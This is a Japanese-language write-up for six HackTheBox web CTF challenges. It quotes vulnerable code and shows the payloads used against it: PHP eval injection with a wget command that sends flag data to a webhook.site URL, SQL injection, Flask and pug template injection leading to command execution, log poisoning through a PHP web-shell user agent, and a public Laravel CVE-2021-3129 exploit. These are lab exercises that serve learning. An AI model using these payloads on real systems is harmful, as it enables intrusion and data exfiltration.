# 問題
- SimPlay	
- Potent Quotes
- BoneChewerCon
- IMF - Landing
- IMF - The Search
- Userland City


# SimPlay	
> ソースコードあり

index.php より
```php
 $router = new Router();
$router->new('GET', '/', 'TimeController@index');
```
TimeController 
```php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

TimeModel
```php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = $format;

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function gettime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'something went terribly wrong';
    }
}
```

外部からの入力をそのまま `eval` に入れていることがわかる  
よって RCEができる。
```shell
wget --post-data=$(cat $(ls /flag*)) https://webhook.site/dcf915da-b9e1-44db-8eba-0843063519b4
```

`HTB{3v4l_h4s_put_y0ur_3v1l_pl4ns_und3r!}`
# Potent Quotes

与えられたソースコードを見ると以下のようなルーティングが存在することがわかる。  
よって目標は `user == 'admin'` になること。  


```js
router.post('/login', (req, res) => {

	let { username, password } = req.body;

	if (username && password) {
		return db.login(username, password)
			.then(user => {
                
				if (user == 'admin') {
                    return res.send(response(fs.readFileSync('/app/flag').toString()))
                };

				if (!user) {
                    return res.send(response('This record does not exist'))
                };
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});
```
`db.login` は以下のようになっており、外部からの文字列でそのままクエリを組み立てているため  
sqli が可能。  

```js
    async login(user, pass) {
        return new Promise(async (resolve, reject) => {
            try {
                let query = `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`;
                let row = await this.db.get(query);
                resolve(row !== undefined ? row.username : false);
            } catch(e) {
                reject(e);
            }
        });
    }
```

`HTB{sql_injecting_my_way_in}`

# BoneChewerCon
> ソースコードなし

レスポンスヘッダーから flaskであると推測できる。  
文字列を クエリパラメータとして受け、それがそのままレスポンスに埋まっていることから、  
SSTI を考え、`{{7*7}}` を送ったところ評価されて返ってきたため SSTI が可能。

`{{ config.items() }}`の中にフラグが含まれていた。

`HTB{r3s3rv4t1on_t0_h311_1s_a11_s3t!}`
# IMF - Landing
> ソースコードなし

トップページが `/?page=home.php` のような URLであることから、`page` の値のファイルを読み込みそれを表示していると考えられる。  
`php://filter/convert.base64-encode/resource=index.php` を送ると、
index.php が得られる。
```php
<?php
if ($_GET['page']) {
    include($_GET['page']);
} else {
    header("Location: /?page=home.php");
}
```

また レスポンスヘッダーから nginx が使われていることがわかるので nginx の config を取り出す。

```nginx
user www;
pid /run/nginx.pid;
error_log /dev/stderr info;

events {
    worker_connections 1024;
}

http {
    server_tokens off;
    log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
    access_log /dev/stdout docker;
    access_log /var/log/nginx/access.log docker;

    charset utf-8;
    keepalive_timeout 20s;
    sendfile on;
    tcp_nopush on;
    client_max_body_size 1M;
    include  /etc/nginx/mime.types;

    server {
        listen 80;
        server_name _;

        index index.php;
        root /www;

        location / {
            try_files $uri $uri/ =404;
            location ~ \.php$ {
                try_files $uri =404;
                fastcgi_pass unix:/run/php-fpm.sock;
                fastcgi_index index.php;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                include fastcgi_params;
            }
        }
    }
}
```

log に UA が含まれており、ファイルの場所もわかるため、RCE が可能になる。  
UA を以下のようにする。  
```php
<?php echo "<pre>";system($_GET['cmd']); echo "</pre>" ?>;
```
`page=/var/log/nginx/access.log&cmd=cat $(ls /flag*)`

`HTB{m1ss10n_4c0mpl1sh3d}`
# IMF - The Search

default.route.js をみると以下のようなルーティングがある。  
```js
defaultRoutes.route('/').post( (req, res) => {
	let name = req.body.name;
	let search = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); 
	if (typeof name !== 'undefined' && name != "") {
		query = { name : {$regex: search, $options: "i"} };
		Agent.find(query,  (err, agents) => {
			if (err) {
				console.log(err);
				return res.json(err);
			} else {
				return res.render('index', { agents: agents, name: pug.render(`| ${name}`) });
			}
		});
	} else {
		return res.redirect('/');
	}
});
```

pug render に直接外部入力が入っているので、SSTIができる  
先頭に `|` があるため改行コードをはさむ必要がある。  
`%0a#{7*7} = 49`のようなリクエストを送る。
以下の payload で RCE する  
```js
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('cat $(ls /flag*)')}()}
```

`HTB{SST1_by_f0rc3}`
# Userland City
>ソースコード無し。

問題文から laravel がデバッグモードで動いていることがわかる。  
次に画像をアップロードする箇所が存在したので、画像以外のファイルをアップロードし、開くとエラーを吐く。  
これにより laravel のバージョンが 8.10 とわかる。  
以上より、CVE2021-3129 だと推測できる。
以下の exploit を 利用して RCE しフラグを手に入れる。
https://github.com/nth347/CVE-2021-3129_exploit

`cat $(ls /flag*)`

`HTB{p0p..p0p..p0p..th0s3_ch41ns_0n_th3_w4y_t0_pr1s0n}`